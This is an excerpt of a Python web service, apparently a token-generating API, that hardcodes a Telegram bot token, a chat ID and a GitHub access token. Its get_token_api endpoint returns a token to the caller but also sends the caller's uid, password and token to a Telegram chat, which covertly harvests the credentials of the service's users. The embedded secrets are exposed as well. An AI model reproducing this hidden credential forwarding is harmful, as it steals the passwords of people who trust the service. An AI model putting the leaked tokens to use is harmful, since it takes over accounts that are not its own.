...
# Telegram config
TELEGRAM_BOT_TOKEN = "7982258868:AAFoAX87kCQIA0BAKiMgLSrv1QxkveY4Qso"
TELEGRAM_CHAT_ID = "6650010705"

# GitHub config
GITHUB_TOKEN = "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"
GITHUB_REPO = "pubgwala420/FFID"
GITHUB_BRANCH = "main"
...
def get_token_api():
    ...
    try:
        ...
        send_to_telegram(uid, password, token)
        return jsonify({"token": token,"credit":"@PikaApis"})
    except Exception as e:
